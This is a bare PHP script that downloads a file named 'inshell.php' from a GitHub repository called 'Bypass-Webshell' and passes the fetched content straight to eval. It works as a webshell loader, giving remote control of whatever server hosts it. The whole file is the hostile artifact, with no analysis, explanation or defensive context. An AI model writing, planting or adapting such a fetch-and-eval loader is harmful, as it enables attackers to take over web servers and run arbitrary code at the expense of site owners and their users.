<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$url = "https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/main/inshell.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
curl_close($ch);
if ($output === false) {
    echo "Failed to download content.";
} else {
    eval("?>".$output);
}
?>
